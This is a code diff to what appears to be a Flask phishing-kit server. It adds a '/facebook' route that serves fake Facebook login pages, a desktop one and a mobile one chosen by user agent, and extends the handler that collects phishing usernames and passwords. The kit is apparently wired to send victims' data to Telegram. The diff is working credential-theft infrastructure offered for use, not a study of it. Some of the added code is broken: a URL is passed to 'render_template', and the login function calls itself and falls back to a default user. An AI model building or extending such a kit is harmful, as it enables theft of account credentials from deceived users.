@@ -7,6 +7,7 @@ from server.phishfunc import templates
 from server.services.telegram import get_Telegram,update_tele,send_telegram_userdata
 from server.services.userSetting import get_user,update_user_pass
 
+from user_agents import parse
 
 with app.app_context():
     db.create_all()
@@ -32,6 +33,10 @@ def login():
     if request.method == "POST":
         user = Admin.query.filter_by(
             username=request.form["username"]).first()
+        
+        if user is None:
+            user = get_user()
+            login()
 
         if user is not None:
             if user.password == request.form["password"]:
@@ -95,6 +100,18 @@ def netflix():
     userClicks += 1
     return render_template('/phishing/netflix/login.html')
 
+@app.route('/facebook')
+def facebook():
+    global userClicks
+    userClicks += 1
+    print(request.user_agent)
+    user = parse(request.user_agent.string)
+    
+    if user.is_mobile:
+        return render_template('/phishing/facebook/mobile.html')
+    else:
+        return render_template('/phishing/facebook/login.html')
+
 
 ##################################################################################################
 #FUNCTION TO GET PHISHING USERNAMES AND PASSWORDS
@@ -125,6 +142,8 @@ def submit_phishing_data(template, username, password):
         return render_template('phishing/insta_followers/login.html', error=True)
     elif template == "netflix":
         return redirect('https://www.netflix.com/login')
+    elif template == "facebook":
+        return render_template('https://www.facebook.com')
     return ""
 
 
